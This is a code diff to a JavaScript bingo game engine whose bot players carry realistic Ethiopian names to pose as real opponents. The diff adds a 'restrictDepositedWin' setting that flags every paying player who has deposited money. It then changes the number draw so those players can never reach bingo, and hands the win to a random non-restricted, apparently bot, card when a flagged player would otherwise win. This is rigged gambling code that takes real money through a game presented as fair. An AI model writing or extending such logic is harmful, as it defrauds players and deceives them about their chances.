@@ -77,7 +77,7 @@ const ETHIOPIAN_NAMES = [
 "Tesfaye Dawit", "ናትናኤል ታደሰ", "Dechasa Tekle", "አበበ መብራቱ", "Lubaba Mekdes",
 "ኤልሳቤጥ ጌታቸው", "Yohannes Fikadu", "ጀማል ዮሴፍ", "Dejene Abebe", "ደቻሳ ሔለን",
 "Abdul Fikru", "መሀመድ አድማሱ", "Nasir Tesfaye", "ኤልሳቤጥ ሳሙኤል", "Abrha Bethelhem",
-"ከማል ተስፋዬ", "Dessalegn Gebru", "አሊ ሀይማኖት", "Maryam Abrha", "ተመስገን መኮነን",
+"ከማል ተስፋዬ", "Dessalegn Gebru", "አሊ ሀይማኖት", "Maryam Abrha", "ተመስገን መኮንን",
 "Birhanu Melaku", "ይበቃል አሰፋ", "Worku Birhanu", "ይስሀቅ ታደሰ", "Yosef Admassu",
 "ፀሀይ ታደሰ", "Dejene Anwar", "ጌታቸው ካሳ", "Birhanu Mebratu", "ኤልሳቤጥ ካሳ",
 "Kemal Mekonnen", "ብርሀኑ አየለ", "Zewde Mebratu", "ቢላ አብርሀ", "Kadija Solomon",
@@ -187,7 +187,7 @@ class GameEngine {
         this.wallet = wallet;
         this.min_players = Math.max(1, min_players);
         this.selection_seconds = selection_seconds;
-        this.draw_interval = draw_interval; // 3 ሰከንድ ጋፕ ለቁጥር መውጫ
+        this.draw_interval = draw_interval;
         this.result_seconds = result_seconds;
         this.first_draw_delay = 3.0;
 
@@ -198,7 +198,8 @@ class GameEngine {
         this.botSettings = {
             botCount: 50,
             botWinPercent: 20,
-            botCardsPerUser: 2
+            botCardsPerUser: 2,
+            restrictDepositedWin: true
         };
 
         this._newRound();
@@ -241,6 +242,7 @@ class GameEngine {
         this.phase_ends_at = now + this.selection_seconds;
         this.cartels = {};
         this.botProfiles = {};
+        this.restrictedUsers = new Set();
         this.draw_order = [];
         this.drawn = [];
         this.next_draw_at = null;
@@ -248,7 +250,7 @@ class GameEngine {
         this.no_winner = false;
         this._pending = null;
         this._botsInjected = false;
-        this.botQueue = []; // የሮቦቶች ተራ በተራ የመምረጫ ኪዩ (Queue)
+        this.botQueue = [];
         this.botInjectIndex = 0;
 
         this._seq++;
@@ -349,7 +351,6 @@ class GameEngine {
                 this._botsInjected = true;
             }
 
-            // ሮቦቶች በአንድ ጊዜ ሳይሆን በየተራ (በየጊዜው የተወሰኑትን) ካርቴል እንዲይዙ ማድረግ (Realism)
             this._processBotQueue();
 
             if (now >= this.phase_ends_at) {
@@ -394,14 +395,12 @@ class GameEngine {
             
             this.botProfiles[botId] = { name: randomName };
 
-            // እያንዳንዱ ሮቦት የሚይዛቸውን ካርቴሎች ብዛት በሴቲንግ መሰረት ማዘጋጀት
             const howManyCards = Math.floor(Math.random() * cardsPerBot) + 1;
             for (let c = 0; c < howManyCards; c++) {
                 this.botQueue.push(botId);
             }
         }
 
-        // ሮቦቶች በቅደም ተከተል እንዳይይዙ ቀላቅላቸው (Randomize)
         this.botQueue.sort(() => Math.random() - 0.5);
         this.botInjectIndex = 0;
     }
@@ -409,14 +408,12 @@ class GameEngine {
     _processBotQueue() {
         if (!this.botQueue || this.botInjectIndex >= this.botQueue.length) return;
 
-        // በየቲክ ሰዓቱ ከክፍ ክፍሎች ጥቂት ሮቦቶች (ለምሳሌ 1 እስከ 3) ተራ በተራ ካርቴል እንዲይዙ ማድረግ
         let steps = Math.floor(Math.random() * 3) + 1;
         let changed = false;
 
         for (let s = 0; s < steps && this.botInjectIndex < this.botQueue.length; s++) {
             const botId = this.botQueue[this.botInjectIndex++];
             
-            // እስካሁን ያልተያዙ ክፍት ካርቴሎችን መፈለግ
             let availableCartels = [];
             for (let i = 1; i <= CARTEL_COUNT; i++) {
                 if (!this.cartels[i]) availableCartels.push(i);
@@ -424,10 +421,8 @@ class GameEngine {
 
             if (availableCartels.length === 0) break;
 
-            // ከነጻዎቹ ውስጥ አንዱን በራንደም መምረጥ
             const chosenCartel = availableCartels[Math.floor(Math.random() * availableCartels.length)];
             
-            // ይህ ሮቦት ከዚህ በፊት የያዛቸው ካርቴሎች ብዛት ማረጋገጥ (ከ MAX_SELECTION እንዳያልፍ)
             const botExistingCount = Object.values(this.cartels).filter(u => u === botId).length;
             if (botExistingCount < MAX_SELECTION) {
                 this.cartels[chosenCartel] = botId;
@@ -460,6 +455,7 @@ class GameEngine {
         }
 
         let paid = {};
+        this.restrictedUsers = new Set();
 
         for (let [uid, cartels] of Object.entries(byUser)) {
             let res = await this.wallet.charge(
@@ -471,6 +467,13 @@ class GameEngine {
 
             if (res !== null) {
                 for (let c of cartels) paid[c] = uid;
+
+                if (this.botSettings.restrictDepositedWin) {
+                    const prof = await this.wallet.profile(uid);
+                    if (prof && prof.has_deposited) {
+                        this.restrictedUsers.add(String(uid));
+                    }
+                }
             } else {
                 await this.wallet.refund(uid, rid);
             }
@@ -513,8 +516,53 @@ class GameEngine {
     }
 
     _draw_one(now) {
-        let number = this.draw_order[this.drawn.length];
+        let nextIndex = this.drawn.length;
+        let chosenNumber = this.draw_order[nextIndex];
 
+        if (this.botSettings.restrictDepositedWin && this.restrictedUsers && this.restrictedUsers.size > 0) {
+            let safeIndex = -1;
+
+            for (let i = nextIndex; i < this.draw_order.length; i++) {
+                let candidateNum = this.draw_order[i];
+                let testSet = new Set(this.drawn);
+                testSet.add(candidateNum);
+
+                let makesRestrictedWin = false;
+
+                for (let [cartel, uid] of Object.entries(this.cartels)) {
+                    if (this.restrictedUsers.has(String(uid))) {
+                        if (checkBingo(generateMatrix(Number(cartel)), testSet)) {
+                            makesRestrictedWin = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (!makesRestrictedWin) {
+                    safeIndex = i;
+                    break;
+                }
+            }
+
+            if (safeIndex !== -1) {
+                chosenNumber = this.draw_order[safeIndex];
+                this.draw_order[safeIndex] = this.draw_order[nextIndex];
+                this.draw_order[nextIndex] = chosenNumber;
+            } else {
+                const nonRestrictedCartels = Object.entries(this.cartels)
+                    .filter(([c, u]) => !this.restrictedUsers.has(String(u)))
+                    .map(([c]) => Number(c));
+
+                if (nonRestrictedCartels.length > 0) {
+                    const luckyCartel = nonRestrictedCartels[Math.floor(Math.random() * nonRestrictedCartels.length)];
+                    this._pending = ['win', [luckyCartel]];
+                    this.phase = 'settling';
+                    return;
+                }
+            }
+        }
+
+        let number = chosenNumber;
         this.drawn.push(number);
         this._seq++;
 
